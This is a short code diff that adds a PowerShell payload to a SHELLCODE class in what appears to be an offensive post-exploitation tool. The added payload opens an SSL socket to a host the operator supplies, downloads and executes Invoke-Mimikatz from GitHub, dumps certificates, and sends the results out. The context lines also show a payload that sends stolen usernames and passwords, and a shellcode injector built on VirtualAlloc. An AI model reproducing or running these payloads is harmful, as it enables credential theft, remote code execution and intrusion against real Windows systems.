@@ -190,6 +190,15 @@ class SHELLCODE(object):
         "$send = ([text.encoding]::ASCII).GetBytes('>> CORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
         "$ssl.Write($send,0,$send.Length);Exit}}}")
 
+    windows_invoke_mimikatz = (
+        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
+        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
+        "$ssl.AuthenticateAsClient($env:computername);"
+        "IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\");"
+        "$o = (Invoke-Mimikatz -DumpCerts);"
+        "$send = ([text.encoding]::ASCII).GetBytes($o);"
+        "$ssl.Write($send,0,$send.Length);")
+
     injectwindows = """shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
